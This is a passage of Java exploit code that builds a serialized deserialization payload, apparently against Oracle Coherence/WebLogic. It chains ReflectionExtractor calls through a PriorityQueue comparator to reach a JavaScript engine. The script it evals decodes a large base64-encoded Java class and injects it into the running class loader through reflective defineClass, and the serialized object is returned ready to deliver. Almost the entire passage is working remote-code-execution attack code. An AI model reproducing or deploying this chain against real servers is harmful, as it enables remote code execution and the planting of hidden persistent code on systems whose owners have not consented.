BwAAAFcAAgADAAAAESoruAFgTSwEtgFjLCq2AWWwAAAAAgAVAAAADgADAAAAyAAGAMkACwDKABYAAAAgAAMAAAARAVkAGAAAAAAAEQFaAP8AAQAGAAsBWwFcAAIADgAAAAQAAQAvAAgBXQFeAAIABwAAAMcAAwAEAAAAKCq2AHBNLMYAGSwrtgFsTi0EtgFjLbBOLLYBb02n/+m7AWdZK7cBcr8AAQAJABUAFgFnAAQAFQAAACYACQAAAM4ABQDPAAkA0QAPANIAFADTABYA1AAXANUAHADWAB8A2AAWAAAANAAFAA8ABwFbAVwAAwAXAAUA0AFoAAMAAAAoAVkAGAAAAAAAKAFaAP8AAQAFACMAzwBDAAIBIwAAAAwAAQAFACMAzwEkAAIAHwAAAA0AA/wABQcATVAHAWcIAA4AAAAEAAEBZwApAQwBDQACAAcAAAIXAAMACQAAAMoqwQBNmQAKKsAATacAByq2AHA6BAE6BRkEOgYZBccAZBkGxgBfLMcAQxkGtgGBOgcDNggVCBkHvqIALhkHFQgytgGCK7YBhZkAGRkHFQgytgGJvpoADRkHFQgyOgWnAAmECAGn/9CnAAwZBisstgD4OgWn/6k6BxkGtgFvOgan/50ZBccADLsBMlkrtwGKvxkFBLYAaCrBAE2ZABoZBQEttgBssDoHuwGMWRkHtgGPtwGQvxkFKi22AGywOge7AYxZGQe2AY+3AZC/AAMAJQByAHUBMgCcAKMApAE2ALMAugC7ATYAAwAVAAAAbgAbAAAA3QAUAN4AFwDgABsA4QAlAOMAKQDlADAA5gA7AOcAVgDoAF0A6QBgAOYAZgDsAGkA7QByAPEAdQDvAHcA8AB+APEAgQDzAIYA9ACPAPYAlQD3AJwA+QCkAPoApgD7ALMA/wC7AQAAvQEBABYAAAB6AAwAMwAzAD8ANAAIADAANgFzAXQABwB3AAcA0AF1AAcApgANANABdgAHAL0ADQDQAXYABwAAAMoBWQAYAAAAAADKAXcA/wABAAAAygF4AXkAAgAAAMoBegAdAAMAFAC2AM8AQwAEABcAswF7ADYABQAbAK8BfABDAAYAHwAAAC8ADg5DBwBN/gAIBwBNBwBPBwBN/QAXBwF9ASz5AAUCCEIHATILDVQHATYORwcBNgAOAAAACAADATIBNAE2AAEBkQAAAAIBkg==\n";

        String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "        try{\n" +
                "            var clazz = classLoader.loadClass('EncryptionUtil');\n" +
                "            clazz.newInstance();\n" +
                "        }catch(err){\n" +
                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "            method.setAccessible(true);\n" +
                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "            clazz.newInstance();\n" +
                "        }";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
//                new Object[]{"java.lang.Thread.sleep(5000);"}
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, extractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = ScriptEngineManager.class;
        queueArray[1] = "1";

        //序列化
        return Util.serialize(queue);
    }
}
